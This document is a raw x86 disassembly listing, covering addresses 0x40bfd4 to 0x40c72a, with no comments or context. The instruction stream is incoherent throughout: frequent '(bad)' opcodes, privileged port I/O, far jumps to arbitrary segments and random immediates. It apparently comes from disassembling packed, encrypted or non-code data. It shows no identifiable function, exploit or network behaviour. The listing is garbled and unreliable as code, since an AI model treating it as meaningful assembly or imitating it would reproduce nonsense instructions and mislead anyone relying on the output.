  40bfd4:	bound  ebp,QWORD PTR [edx+eax*1-0x2b]
  40bfd8:	mov    ds:0x821a3759,al
  40bfdd:	or     BYTE PTR [edi+0x43d89e63],bh
  40bfe3:	sbb    DWORD PTR [ebx+0x41430a6e],ebx
  40bfe9:	jnp    0x40c04e
  40bfeb:	mov    eax,0x309dc435
  40bff0:	dec    edi
  40bff1:	in     al,0xef
  40bff3:	mov    ds:0x884a00b4,al
  40bff8:	nop
  40bff9:	mov    ebx,0x79f2316b
  40bffe:	jns    0x40bfb4
  40c000:	push   ss
  40c001:	leave  
  40c002:	dec    edi
  40c003:	adc    DWORD PTR [ebx-0x61],esi
  40c006:	arpl   WORD PTR [edi+eax*1-0x69a578b4],si
  40c00d:	aam    0x5e
  40c00f:	scas   eax,DWORD PTR es:[edi]
  40c010:	shl    esp,1
  40c012:	or     edx,eax
  40c014:	sub    al,0x1c
  40c016:	or     esp,DWORD PTR [ecx]
  40c018:	repnz loop 0x40bfce
  40c01b:	xchg   BYTE PTR [ecx-0x502a78fb],bl
  40c021:	pop    eax
  40c022:	gs aad 0xb2
  40c025:	imul   ecx,DWORD PTR [ebx+eiz*4],0x67
  40c029:	in     al,dx
  40c02a:	inc    edi
  40c02b:	and    al,cl
  40c02d:	aam    0x61
  40c02f:	aaa    
  40c030:	push   cs
  40c031:	out    dx,eax
  40c032:	sub    DWORD PTR [edi],ebp
  40c034:	addr16 xchg dl,bh
  40c037:	inc    ebp
  40c038:	push   edi
  40c039:	adc    esp,DWORD PTR [ebx+0x72]
  40c03c:	out    0x3,al
  40c03e:	jl     0x40c0a2
  40c040:	outs   dx,DWORD PTR ds:[esi]
  40c041:	sbb    DWORD PTR [eax],ecx
  40c043:	shl    edx,1
  40c045:	xchg   ebx,edi
  40c047:	xchg   ebp,eax
  40c048:	ret    
  40c049:	leave  
  40c04a:	or     BYTE PTR [edi+0x9],bl
  40c04d:	(bad)  
  40c04e:	jge    0x40c01e
  40c050:	cmp    al,0xdd
  40c052:	rol    ebx,0x70
  40c055:	jmp    0x40c01c
  40c057:	(bad)
  40c05a:	jno    0x40c05c
  40c05c:	pop    esp
  40c05d:	dec    eax
  40c05e:	mov    dh,0x21
  40c060:	push   0x58
  40c062:	add    dl,0x15
  40c065:	mov    ds:0x68546be5,al
  40c06a:	in     al,0x10
  40c06c:	adc    dl,dh
  40c06e:	inc    esi
  40c06f:	addr16 int3 
  40c071:	mov    cl,0x78
  40c073:	sub    eax,0x46a1bdb4
  40c078:	fsubr  QWORD PTR [ebx+ecx*2]
  40c07b:	mov    ecx,0xb577be10
  40c080:	push   ebx
  40c081:	sbb    eax,0xf0159afc
  40c086:	or     al,0x29
  40c088:	mov    bh,0xeb
  40c08a:	lea    esp,[ebp-0x28]
  40c08d:	mov    cl,0x9d
  40c08f:	nop
  40c090:	daa    
  40c091:	and    DWORD PTR fs:[ebx+ebx*8+0x53],ebp
  40c096:	out    0x42,al
  40c098:	sub    ah,BYTE PTR [edx-0x6e]
  40c09b:	xor    bl,cl
  40c09d:	enter  0x8c04,0x80
  40c0a1:	test   eax,0xd64183c9
  40c0a6:	push   es
  40c0a7:	jo     0x40c031
  40c0a9:	data16 int3 
  40c0ab:	push   eax
  40c0ac:	ins    DWORD PTR es:[edi],dx
  40c0ad:	idiv   ah
  40c0af:	add    DWORD PTR [edx],0x7818e888
  40c0b5:	dec    ebp
  40c0b6:	adc    dl,ah
  40c0b8:	sbb    eax,0x5a39dbb3
  40c0bd:	dec    edi
  40c0be:	mov    BYTE PTR [esi-0x1ca63778],cl
  40c0c4:	and    DWORD PTR [esi],ecx
  40c0c6:	shl    BYTE PTR [ebp+0x2b],cl
  40c0c9:	cs dec edx
  40c0cb:	je     0x40c0b0
  40c0cd:	std    
  40c0ce:	addr16 repnz mov al,0x7f
  40c0d2:	je     0x40c139
  40c0d4:	pop    esi
  40c0d5:	fstp   QWORD PTR [edi]
  40c0d7:	enter  0xdcb4,0x7c
  40c0db:	push   eax
  40c0dc:	pop    ss
  40c0dd:	dec    ebp
  40c0de:	scas   eax,DWORD PTR es:[edi]
  40c0df:	out    0x7d,eax
  40c0e1:	sbb    eax,0x8adef489
  40c0e6:	or     al,0x81
  40c0e8:	push   esp
  40c0e9:	adc    al,0x5
  40c0eb:	sahf   
  40c0ec:	test   BYTE PTR [ebp-0x42],dl
  40c0ef:	mov    dl,BYTE PTR [ecx]
  40c0f1:	loope  0x40c133
  40c0f3:	adc    bh,BYTE PTR [edi]
  40c0f5:	pop    edi
  40c0f6:	fcomp  QWORD PTR gs:[ebp+eiz*1+0xf]
  40c0fb:	aad    0x97
  40c0fd:	(bad)  
  40c0fe:	push   ecx
  40c0ff:	pop    eax
  40c100:	dec    esi
  40c101:	inc    edi
  40c102:	xor    BYTE PTR [eax],dl
  40c104:	sub    esp,DWORD PTR [ecx+esi*4]
  40c107:	dec    esp
  40c108:	dec    ebx
  40c109:	loopne 0x40c181
  40c10b:	mov    dh,0x91
  40c10d:	mov    DWORD PTR [edx],ebp
  40c10f:	outs   dx,DWORD PTR ds:[esi]
  40c110:	xchg   ebp,eax
  40c111:	scas   al,BYTE PTR es:[edi]
  40c112:	ror    BYTE PTR [edx+0x5a],cl
  40c115:	xchg   ecx,eax
  40c116:	pop    esp
  40c117:	int3   
  40c118:	loopne 0x40c0f9
  40c11a:	lock xchg ecx,eax
  40c11c:	sub    al,BYTE PTR [eax-0x7]
  40c11f:	repnz sbb BYTE PTR [ebp+eax*2+0x1d],dh
  40c124:	popa   
  40c125:	and    eax,0x1c58118f
  40c12a:	adc    eax,0x30247aaf
  40c12f:	int    0xbe
  40c131:	cli    
  40c132:	in     eax,dx
  40c133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c134:	pop    ss
  40c135:	mov    edx,0x3d03370
  40c13a:	pop    eax
  40c13b:	lods   eax,DWORD PTR ds:[esi]
  40c13c:	xor    eax,DWORD PTR [edx-0x4d]
  40c13f:	push   ebx
  40c140:	cld    
  40c141:	pop    edx
  40c142:	(bad)  
  40c144:	loopne 0x40c163
  40c146:	sti    
  40c147:	jg     0x40c0d5
  40c149:	imul   edi,DWORD PTR [edi-0x7c],0xffffffb7
  40c14d:	xchg   esi,eax
  40c14e:	popf   
  40c14f:	test   DWORD PTR [esp+eax*2-0x52],0x90ea470f
  40c157:	sar    DWORD PTR [ecx],0x8f
  40c15a:	mov    dh,BYTE PTR es:[ebp-0x207ec440]
  40c161:	or     dl,BYTE PTR [ebp-0x5f76fc95]
  40c167:	mov    ebp,0x179cfb01
  40c16c:	inc    edi
  40c16d:	push   esp
  40c16e:	fwait
  40c16f:	aad    0x9c
  40c171:	or     eax,0xbccbc74a
  40c176:	and    DWORD PTR [esi-0x1c],ebp
  40c179:	pop    esi
  40c17a:	enter  0xfd89,0x4c
  40c17e:	jmp    0x88e5:0x336fa059
  40c185:	loope  0x40c1ca
  40c187:	and    al,0xff
  40c189:	scas   eax,DWORD PTR es:[edi]
  40c18a:	pop    ebx
  40c18b:	sub    al,0x97
  40c18d:	std    
  40c18e:	xchg   edx,eax
  40c18f:	fimul  DWORD PTR [esp+eiz*2-0x6e]
  40c193:	jno    0x40c13c
  40c195:	push   ebx
  40c196:	mov    ds:0xed09d809,eax
  40c19b:	cmp    BYTE PTR [ecx-0x1c],dh
  40c19e:	into   
  40c19f:	pop    ecx
  40c1a0:	dec    edi
  40c1a1:	lds    ebx,FWORD PTR [ecx+edx*2-0x6716c6]
  40c1a8:	stc    
  40c1a9:	jg     0x40c1f5
  40c1ab:	adc    al,0x7b
  40c1ad:	sbb    eax,0xacddbca9
  40c1b2:	pop    es
  40c1b3:	lods   al,BYTE PTR ds:[esi]
  40c1b4:	adc    al,0x1
  40c1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1b7:	daa    
  40c1b8:	stos   DWORD PTR es:[edi],eax
  40c1b9:	add    DWORD PTR [edx-0x6d],eax
  40c1bc:	mov    edi,0xc6bdbde9
  40c1c1:	hlt    
  40c1c2:	imul   edi,DWORD PTR [ecx+eax*2],0x2b
  40c1c6:	sbb    esi,DWORD PTR [esi+0x68]
  40c1c9:	or     DWORD PTR [eax],esi
  40c1cb:	cmp    BYTE PTR [ebp+0x62],cl
  40c1ce:	pop    edx
  40c1cf:	sbb    DWORD PTR [edi+0x3c071013],edi
  40c1d5:	mov    eax,0xdd8d69aa
  40c1da:	or     BYTE PTR es:[esi],ch
  40c1dd:	xor    bl,BYTE PTR [eax+ebx*1-0x3a]
  40c1e1:	dec    esp
  40c1e2:	shl    DWORD PTR cs:[ebp-0x41],1
  40c1e6:	adc    eax,0x83627436
  40c1eb:	(bad)  
  40c1ec:	or     BYTE PTR [esp+ebp*2-0x16b8b0db],bh
  40c1f3:	cmp    DWORD PTR [esi-0x4c],ebx
  40c1f6:	mov    ah,0xcf
  40c1f8:	aaa    
  40c1f9:	lea    eax,ds:0x43fabc4
  40c1ff:	popa   
  40c200:	inc    eax
  40c201:	inc    esi
  40c202:	cmc    
  40c203:	ja     0x40c1ad
  40c205:	aam    0xc2
  40c207:	push   edi
  40c208:	shl    DWORD PTR ds:0x8732e5e3,0xf3
  40c20f:	mov    edx,esi
  40c211:	mov    ebx,0x47bb413d
  40c216:	mov    ecx,0x864b5627
  40c21b:	pop    es
  40c21c:	(bad)  
  40c21d:	sub    DWORD PTR [edx+ebp*8+0x6e],ecx
  40c221:	sub    BYTE PTR [eax+ebx*8+0x3d],cl
  40c225:	add    DWORD PTR [ecx+eiz*1],ebx
  40c228:	mov    ah,0x21
  40c22a:	shl    DWORD PTR [ebp-0x59b275c6],cl
  40c230:	jmp    0x6a7b:0xecff2a9a
  40c237:	push   eax
  40c238:	dec    esp
  40c239:	cmp    dl,BYTE PTR [ebx+0x1e34ad53]
  40c23f:	bound  esp,QWORD PTR [edx+ebp*1]
  40c242:	repz push cs
  40c244:	dec    ecx
  40c245:	mov    BYTE PTR [edi],ch
  40c247:	add    esp,DWORD PTR [esi-0x1e]
  40c24a:	mov    ecx,0xfa5b5533
  40c24f:	sbb    ecx,ecx
  40c251:	xor    eax,0x2f1ca144
  40c256:	out    0x21,al
  40c258:	or     ebx,DWORD PTR [eax+0x2cffa274]
  40c25e:	sahf   
  40c25f:	mov    eax,ds:0xb1393bc7
  40c264:	cmp    eax,esp
  40c266:	cmp    eax,0x65095da6
  40c26b:	jl     0x40c2bd
  40c26d:	outs   dx,DWORD PTR ds:[esi]
  40c26e:	scas   eax,DWORD PTR es:[edi]
  40c26f:	dec    edx
  40c270:	in     al,0x32
  40c272:	daa    
  40c273:	xor    ch,BYTE PTR [eax]
  40c275:	push   edi
  40c276:	inc    esp
  40c277:	fild   QWORD PTR ds:0x40e1d526
  40c27d:	stos   BYTE PTR es:[edi],al
  40c27e:	ins    BYTE PTR es:[edi],dx
  40c27f:	adc    cl,BYTE PTR [eax]
  40c281:	sub    al,0xee
  40c283:	dec    esp
  40c284:	stos   DWORD PTR es:[edi],eax
  40c285:	and    eax,0xe790798f
  40c28a:	fisub  WORD PTR [ecx+eax*1]
  40c28d:	daa    
  40c28e:	jae    0x40c23a
  40c290:	loope  0x40c252
  40c292:	(bad)  
  40c293:	leave  
  40c294:	out    0xfb,al
  40c296:	ins    BYTE PTR es:[edi],dx
  40c297:	pop    ecx
  40c298:	ret    
  40c299:	jae    0x40c290
  40c29b:	and    eax,0x78871ea2
  40c2a0:	mov    bh,BYTE PTR [edx+0x5b]
  40c2a3:	jmp    0xddcd:0xee255719
  40c2aa:	aam    0xa4
  40c2ac:	pop    ebp
  40c2ad:	popf   
  40c2ae:	lods   al,BYTE PTR ds:[esi]
  40c2af:	pop    ecx
  40c2b0:	(bad)  
  40c2b1:	fidivr WORD PTR ds:0xf2968013
  40c2b7:	add    eax,DWORD PTR [ebp+0x2fc6e145]
  40c2bd:	add    eax,0xaa1c4a87
  40c2c2:	nop
  40c2c3:	cmp    ah,BYTE PTR [ecx+0x1da16eed]
  40c2c9:	cwde   
  40c2ca:	imul   esp,DWORD PTR [edi+0x7473db1f],0x23
  40c2d1:	pop    edi
  40c2d2:	ss xor edx,ecx
  40c2d5:	nop
  40c2d6:	dec    ebp
  40c2d7:	pop    es
  40c2d8:	out    0x7b,al
  40c2da:	jge    0x40c356
  40c2dc:	lahf   
  40c2dd:	push   ecx
  40c2de:	sub    BYTE PTR [esi],ah
  40c2e0:	push   0x41
  40c2e2:	sub    al,0xca
  40c2e4:	outs   dx,BYTE PTR ds:[esi]
  40c2e5:	cmp    eax,DWORD PTR [edi+0x7d271163]
  40c2eb:	ffreep st(2)
  40c2ed:	sbb    esi,DWORD PTR [eax+0x65a64c06]
  40c2f3:	mov    ss,WORD PTR [edx-0x679fc24a]
  40c2f9:	add    al,0xff
  40c2fb:	push   esp
  40c2fc:	jp     0x40c287
  40c2fe:	lods   eax,DWORD PTR ds:[esi]
  40c2ff:	test   BYTE PTR [ebx],bl
  40c301:	mov    esi,edi
  40c303:	data16 cmp ah,BYTE PTR [edi+esi*8-0xf80f07a]
  40c30b:	(bad)  
  40c30d:	gs mov edx,0x59af65bc
  40c313:	dec    esi
  40c314:	gs daa 
  40c316:	adc    al,0x7
  40c318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c319:	cld    
  40c31a:	repz ja 0x40c396
  40c31d:	imul   edi,esi,0xffffffec
  40c320:	scas   eax,DWORD PTR es:[edi]
  40c321:	lods   eax,DWORD PTR ds:[esi]
  40c322:	pop    edx
  40c323:	fyl2xp1 
  40c325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c326:	jbe    0x40c2cb
  40c328:	aam    0x3b
  40c32a:	enter  0x7b0a,0x8a
  40c32e:	(bad)  
  40c32f:	xchg   esi,eax
  40c330:	popf   
  40c331:	jmp    0x4f76:0x8ba6686
  40c338:	aaa    
  40c339:	mov    edx,0x85114432
  40c33e:	das    
  40c33f:	pop    esi
  40c340:	mov    ecx,0x26d7199e
  40c345:	xchg   esi,eax
  40c346:	xchg   edi,eax
  40c347:	jl     0x40c2ca
  40c349:	retf   
  40c34a:	fsubr  DWORD PTR [ecx+edi*8-0x7b]
  40c34e:	dec    esp
  40c34f:	retf   0xc190
  40c352:	inc    edx
  40c353:	in     eax,0xa
  40c355:	inc    edi
  40c356:	inc    ebx
  40c357:	pop    edi
  40c358:	add    BYTE PTR [edi-0x25],dl
  40c35b:	push   ds
  40c35c:	in     eax,0xdb
  40c35e:	outs   dx,BYTE PTR ds:[esi]
  40c35f:	mov    al,0x5c
  40c361:	cmc    
  40c362:	jge    0x40c2e6
  40c364:	xchg   edi,eax
  40c365:	in     al,dx
  40c366:	xchg   esp,eax
  40c367:	in     al,dx
  40c368:	push   ebx
  40c369:	push   edi
  40c36a:	div    DWORD PTR [edi]
  40c36c:	fcom   QWORD PTR [edi]
  40c36e:	adc    edx,DWORD PTR [eax]
  40c370:	sub    al,0xff
  40c372:	adc    eax,0x3dbd8ec2
  40c377:	xor    BYTE PTR [edx+0x2],0xca
  40c37b:	cdq    
  40c37c:	(bad)  
  40c37d:	imul   esp,eax,0x34850cac
  40c383:	dec    esi
  40c384:	iret   
  40c385:	mov    dh,0xb
  40c387:	scas   eax,DWORD PTR es:[edi]
  40c388:	pop    edx
  40c389:	bound  ebp,QWORD PTR [ecx-0x1a]
  40c38c:	mov    al,BYTE PTR [edi+0x6f68af5d]
  40c392:	fidivr DWORD PTR [edi-0x35]
  40c395:	jmp    0xb8db:0x3ed570ae
  40c39c:	adc    eax,0xacfffa6f
  40c3a1:	push   esp
  40c3a2:	pop    esi
  40c3a3:	adc    al,0x1a
  40c3a5:	call   DWORD PTR [ebp-0x1d84ceb8]
  40c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ac:	out    0xa5,eax
  40c3ae:	mov    ds,WORD PTR [eax-0x58]
  40c3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b2:	rol    DWORD PTR [esi],cl
  40c3b4:	sti    
  40c3b5:	jnp    0x40c3b4
  40c3b7:	or     DWORD PTR [esi+0x6a],ecx
  40c3ba:	sbb    DWORD PTR [edi-0xd],0x7b
  40c3be:	add    bh,BYTE PTR [edx]
  40c3c0:	neg    BYTE PTR [ecx-0x26a9c892]
  40c3c6:	aaa    
  40c3c7:	mov    cl,0xee
  40c3c9:	fisubr DWORD PTR [edx]
  40c3cb:	(bad)  
  40c3cc:	arpl   bp,bp
  40c3ce:	add    ah,bh
  40c3d0:	scas   eax,DWORD PTR es:[edi]
  40c3d1:	ja     0x40c3ce
  40c3d3:	mov    ecx,0x852c3837
  40c3d8:	pushf  
  40c3d9:	ret    
  40c3da:	jp     0x40c396
  40c3dc:	(bad)  
  40c3dd:	cli    
  40c3de:	jb     0x40c429
  40c3e0:	pop    ss
  40c3e1:	ins    DWORD PTR es:[edi],dx
  40c3e2:	dec    esp
  40c3e3:	test   al,0x67
  40c3e5:	cmp    bl,BYTE PTR [edi]
  40c3e7:	(bad)  
  40c3e8:	pop    edx
  40c3e9:	push   ds
  40c3ea:	push   ss
  40c3eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ec:	cwde   
  40c3ed:	dec    ebp
  40c3ee:	pop    ss
  40c3ef:	push   cs
  40c3f0:	(bad)  
  40c3f2:	jo     0x40c37f
  40c3f4:	dec    edi
  40c3f5:	js     0x40c380
  40c3f7:	dec    edi
  40c3f8:	push   0xffffffaf
  40c3fa:	sub    eax,0x26d95e53
  40c3ff:	mov    bh,0x7
  40c401:	lock mov ecx,0xca8abfa9
  40c407:	and    DWORD PTR [esi],ebx
  40c409:	retf   0x494c
  40c40c:	mov    esp,0xb2b2b217
  40c411:	sub    DWORD PTR [edi+0xbb59951],esi
  40c417:	and    BYTE PTR [esi+edi*1-0x5ececca1],dl
  40c41e:	scas   al,BYTE PTR es:[edi]
  40c41f:	mov    esi,edx
  40c421:	stos   DWORD PTR es:[edi],eax
  40c422:	sar    BYTE PTR [ebp+0x5c],1
  40c425:	sub    DWORD PTR ds:[eax+0x170fffce],ecx
  40c42c:	test   ecx,edx
  40c42e:	push   edi
  40c42f:	(bad)  
  40c430:	call   0x4da3d600
  40c435:	adc    BYTE PTR [ecx+0x5a],0xf3
  40c439:	in     al,dx
  40c43a:	(bad)  
  40c43b:	arpl   WORD PTR ds:0x3a4586a0,di
  40c441:	sti    
  40c442:	pop    ds
  40c443:	and    bl,BYTE PTR [ebx]
  40c445:	mov    ecx,0xcda6e2fb
  40c44a:	clc    
  40c44b:	pop    eax
  40c44c:	sbb    bl,BYTE PTR [ebx+0x669d6333]
  40c452:	add    ecx,esp
  40c454:	inc    ebx
  40c455:	arpl   cx,si
  40c457:	cli    
  40c458:	mov    WORD PTR [edx+0x204f245c],es
  40c45e:	push   edx
  40c45f:	cmc    
  40c460:	es aaa 
  40c462:	pop    eax
  40c463:	add    BYTE PTR [ebx],dh
  40c465:	cmp    DWORD PTR [ecx+0x39],ebp
  40c468:	mov    ch,0xbf
  40c46a:	shr    DWORD PTR [esi+ebp*2+0x6e04cfc0],0x8e
  40c472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c473:	ret    0x2987
  40c476:	xchg   ebx,eax
  40c477:	xchg   esp,eax
  40c478:	dec    edx
  40c479:	(bad)  
  40c47a:	fsubr  QWORD PTR [ebx-0x11]
  40c47d:	int    0xbd
  40c47f:	jge    0x40c41b
  40c481:	dec    edx
  40c482:	jno    0x40c4f5
  40c484:	jle    0x40c420
  40c486:	push   0x12
  40c488:	add    eax,0x10f8f039
  40c48d:	rcr    DWORD PTR [edx-0x56],1
  40c490:	int3   
  40c491:	fcomp  QWORD PTR [ecx-0x36c9936]
  40c497:	jno    0x40c4b4
  40c499:	loopne 0x40c434
  40c49b:	(bad)  
  40c49c:	mov    ebx,0x676fe94f
  40c4a1:	es lods eax,DWORD PTR es:[esi]
  40c4a4:	xchg   ecx,eax
  40c4a5:	xchg   ebx,eax
  40c4a6:	ror    DWORD PTR [edi-0x63c8b821],cl
  40c4ac:	pop    ebx
  40c4ad:	ins    BYTE PTR es:[edi],dx
  40c4ae:	push   es
  40c4af:	int3   
  40c4b0:	sbb    DWORD PTR [edi+0x53360443],ecx
  40c4b6:	xabort 0x17
  40c4b9:	jmp    0x7878:0xfb353716
  40c4c0:	cmp    cl,BYTE PTR [eax+0x1203d509]
  40c4c6:	inc    eax
  40c4c7:	lods   al,BYTE PTR ds:[esi]
  40c4c8:	xchg   DWORD PTR [esi+0x14],esi
  40c4cb:	mov    BYTE PTR [edx+ebp*4],al
  40c4ce:	cmp    eax,0x7b07537
  40c4d3:	pop    ebx
  40c4d4:	call   0xff1460ba
  40c4d9:	jbe    0x40c519
  40c4db:	cmp    eax,0xfa9f46a7
  40c4e0:	jo     0x40c522
  40c4e2:	jl     0x40c47a
  40c4e4:	nop
  40c4e5:	mov    ds:0x22d6e039,eax
  40c4ea:	out    0xe,al
  40c4ec:	or     DWORD PTR [ebx],0xdd351109
  40c4f2:	mov    bl,0x34
  40c4f4:	mov    dl,0x31
  40c4f6:	(bad)  
  40c4f7:	clc    
  40c4f8:	or     al,0x8e
  40c4fa:	int    0xa2
  40c4fc:	push   eax
  40c4fd:	inc    esi
  40c4fe:	stos   DWORD PTR es:[edi],eax
  40c4ff:	(bad)  
  40c500:	fisubr WORD PTR [esi]
  40c502:	cdq    
  40c503:	lds    ecx,FWORD PTR [ecx]
  40c505:	icebp  
  40c506:	mov    dl,0xa9
  40c508:	jb     0x40c555
  40c50a:	out    dx,al
  40c50b:	sub    bl,BYTE PTR [edx+ebx*8]
  40c50e:	lds    esi,FWORD PTR [eax]
  40c510:	mov    ebx,0x6d6aa263
  40c515:	pop    edx
  40c516:	pop    eax
  40c517:	test   DWORD PTR [ebp+ebp*2-0x410eb8f3],esi
  40c51e:	push   eax
  40c51f:	sbb    al,0x3c
  40c521:	jnp    0x40c524
  40c523:	cli    
  40c524:	jl     0x40c58e
  40c526:	pop    esp
  40c527:	aam    0x0
  40c529:	inc    ecx
  40c52a:	or     bh,BYTE PTR [ebx+ecx*4-0x5091736e]
  40c531:	or     cl,BYTE PTR [esi-0x782efd1f]
  40c537:	inc    edx
  40c538:	pop    ecx
  40c539:	mov    ss,WORD PTR [ebp-0x3e7b60ab]
  40c53f:	inc    ebp
  40c540:	mov    BYTE PTR [edi],dh
  40c542:	pop    ecx
  40c543:	xchg   dh,bl
  40c545:	mov    bh,0xcc
  40c547:	loop   0x40c542
  40c549:	fchs   
  40c54b:	shl    DWORD PTR [eax-0x5d3900ec],cl
  40c551:	cs mov al,0x44
  40c554:	sub    al,0xfa
  40c556:	fld    TBYTE PTR [edx-0x463e111e]
  40c55c:	dec    esi
  40c55d:	cwde   
  40c55e:	(bad)  
  40c55f:	in     al,dx
  40c560:	loope  0x40c572
  40c562:	mov    ecx,0x1e86c9f5
  40c567:	jge    0x40c5a5
  40c569:	(bad)  
  40c56a:	jbe    0x40c582
  40c56c:	mov    ah,0x84
  40c56e:	inc    ecx
  40c56f:	sbb    cl,ch
  40c571:	ss jg  0x40c5c0
  40c574:	popa   
  40c575:	sbb    DWORD PTR [esi],edi
  40c577:	cmp    DWORD PTR [ebp-0x3b04a2e5],eax
  40c57d:	mov    fs,WORD PTR [edi]
  40c57f:	dec    ecx
  40c580:	test   al,0x81
  40c582:	dec    esi
  40c583:	out    0x2c,eax
  40c585:	or     bl,BYTE PTR [ebp-0x7a15a1dc]
  40c58b:	out    0x39,al
  40c58d:	dec    BYTE PTR [edx]
  40c58f:	pop    ebx
  40c590:	pop    eax
  40c591:	dec    ecx
  40c592:	xchg   esi,eax
  40c593:	push   esp
  40c594:	inc    di
  40c596:	push   edx
  40c597:	push   edx
  40c598:	or     eax,0x6b983c9b
  40c59d:	fisubr DWORD PTR [esi-0x6f]
  40c5a0:	cmp    ecx,DWORD PTR [esi+0x1f7b120e]
  40c5a6:	sbb    DWORD PTR [eax+0x55fdbc59],0x665342eb
  40c5b0:	dec    edi
  40c5b1:	leave  
  40c5b2:	dec    esi
  40c5b3:	fdivr  DWORD PTR [ecx+0x4f]
  40c5b6:	mov    WORD PTR [ebx+0x13582fae],?
  40c5bc:	into   
  40c5bd:	jecxz  0x40c5be
  40c5bf:	aad    0xb8
  40c5c1:	stos   DWORD PTR es:[edi],eax
  40c5c2:	xor    dh,BYTE PTR [ecx-0x20]
  40c5c5:	es push esp
  40c5c7:	jge    0x40c566
  40c5c9:	pop    ebx
  40c5ca:	dec    eax
  40c5cb:	fdivr  QWORD PTR ds:0x34e2b971
  40c5d1:	in     al,dx
  40c5d2:	aaa    
  40c5d3:	cmp    al,BYTE PTR [esi-0x1a]
  40c5d6:	xchg   edi,eax
  40c5d7:	in     eax,0x3b
  40c5d9:	mov    esp,0xbd9f877f
  40c5de:	cmp    eax,0x9e372a5d
  40c5e3:	dec    edi
  40c5e4:	das    
  40c5e5:	push   edi
  40c5e6:	nop
  40c5e7:	outs   dx,BYTE PTR ds:[esi]
  40c5e8:	cmp    eax,0x60624def
  40c5ed:	mov    ah,0x66
  40c5ef:	out    dx,al
  40c5f0:	(bad)  
  40c5f1:	sti    
  40c5f2:	xor    eax,0xa287df39
  40c5f7:	mov    dl,al
  40c5f9:	inc    esi
  40c5fa:	or     bl,BYTE PTR [ebp-0x42]
  40c5fd:	aaa    
  40c5fe:	sub    edx,DWORD PTR ds:0x505b666c
  40c604:	enter  0x2ce3,0xd
  40c608:	add    al,0x93
  40c60a:	xchg   ecx,ecx
  40c60c:	xor    esi,DWORD PTR [ecx-0x34]
  40c60f:	outs   dx,BYTE PTR ds:[esi]
  40c610:	retf   0xa151
  40c613:	(bad)  
  40c614:	in     al,0xcf
  40c616:	std    
  40c617:	hlt    
  40c618:	rcl    DWORD PTR [ebx+0x6e],1
  40c61b:	sub    DWORD PTR [esi+0x4f],ebp
  40c61e:	out    dx,al
  40c61f:	cdq    
  40c620:	cmp    eax,edi
  40c622:	mov    al,ds:0x452174de
  40c627:	mov    eax,0x99c52244
  40c62c:	push   0xb04ccc53
  40c631:	inc    edx
  40c632:	test   ebx,esi
  40c634:	aas    
  40c635:	adc    DWORD PTR [ecx+edx*8+0x386ddc3],ebp
  40c63c:	mov    BYTE PTR [edi+0xd],cl
  40c63f:	sbb    DWORD PTR [esi-0x4a],ecx
  40c642:	js     0x40c5ec
  40c644:	mov    edi,0xe5cf3d54
  40c649:	aas    
  40c64a:	adc    BYTE PTR ds:0xe7427bb,ch
  40c650:	mov    al,ds:0xd0ae8321
  40c655:	cmp    al,0xfd
  40c657:	and    eax,0x3a914484
  40c65c:	or     al,0xd
  40c65e:	call   0x56a3a1ef
  40c663:	push   ebp
  40c664:	(bad)  
  40c665:	in     al,0xaa
  40c667:	call   0x9b8e:0xf0fc22f1
  40c66e:	fcmovnu st,st(3)
  40c670:	inc    edi
  40c671:	je     0x40c62f
  40c673:	push   esp
  40c674:	jg     0x40c6d5
  40c676:	iret   
  40c677:	outs   dx,DWORD PTR ds:[esi]
  40c678:	lock mov ?,WORD PTR [edx+0x610c6130]
  40c67f:	out    dx,eax
  40c680:	lock push ss
  40c682:	adc    edi,DWORD PTR [ebp+0x7478d010]
  40c688:	add    ecx,DWORD PTR [edi]
  40c68a:	sbb    dl,BYTE PTR [esp+edi*4]
  40c68d:	retf   0x7281
  40c690:	lahf   
  40c691:	sti    
  40c692:	xchg   esp,eax
  40c693:	fldcw  WORD PTR [esi+esi*8-0x7e]
  40c697:	sbb    eax,0x56ec6757
  40c69c:	loope  0x40c6e1
  40c69e:	sub    dh,BYTE PTR [edi-0x29]
  40c6a1:	mov    ds:0x9b228fb0,eax
  40c6a6:	cmp    BYTE PTR [edx-0x2a],0x21
  40c6aa:	jle    0x40c6b8
  40c6ac:	push   0xffffffee
  40c6ae:	and    ebp,DWORD PTR [edi-0x39c28cda]
  40c6b4:	loope  0x40c698
  40c6b6:	or     ebp,ebx
  40c6b8:	(bad)  
  40c6ba:	loope  0x40c649
  40c6bc:	jb     0x40c68b
  40c6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6bf:	add    DWORD PTR [edi-0x2ab91fdd],esp
  40c6c5:	xor    eax,0x68a35282
  40c6ca:	mov    ebx,0x4e1e64b3
  40c6cf:	adc    BYTE PTR [edi+eax*8-0x44faf3cc],0x52
  40c6d7:	in     al,0x89
  40c6d9:	data16 (bad) 
  40c6db:	aam    0x2
  40c6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6de:	aaa    
  40c6df:	imul   eax,DWORD PTR [eax-0x60],0xe2435bc9
  40c6e6:	bsr    edi,DWORD PTR [edi]
  40c6e9:	fsub   DWORD PTR ds:0xf30a3d97
  40c6ef:	dec    edx
  40c6f0:	out    0x8e,al
  40c6f2:	jns    0x40c6f3
  40c6f4:	sahf   
  40c6f5:	xor    DWORD PTR [ebp+0x49],esi
  40c6f8:	sub    BYTE PTR [esi-0x69],0xae
  40c6fc:	cmovge edi,DWORD PTR [eax+0x6]
  40c700:	scas   al,BYTE PTR es:[edi]
  40c701:	dec    edi
  40c702:	cmp    eax,0x76703d8b
  40c707:	mov    si,0xf0d9
  40c70b:	xlat   BYTE PTR ds:[ebx]
  40c70c:	adc    bh,BYTE PTR [ebx+0x5a704fe8]
  40c712:	jne    0x40c730
  40c714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c715:	mov    esi,0x7296915f
  40c71a:	xor    BYTE PTR [ebx-0x38e0b2f8],0x41
  40c721:	into   
  40c722:	test   cl,ah
  40c724:	jle    0x40c6d6
  40c726:	jle    0x40c722
  40c728:	pop    ds
  40c729:	cld    
  40c72a:	int3   
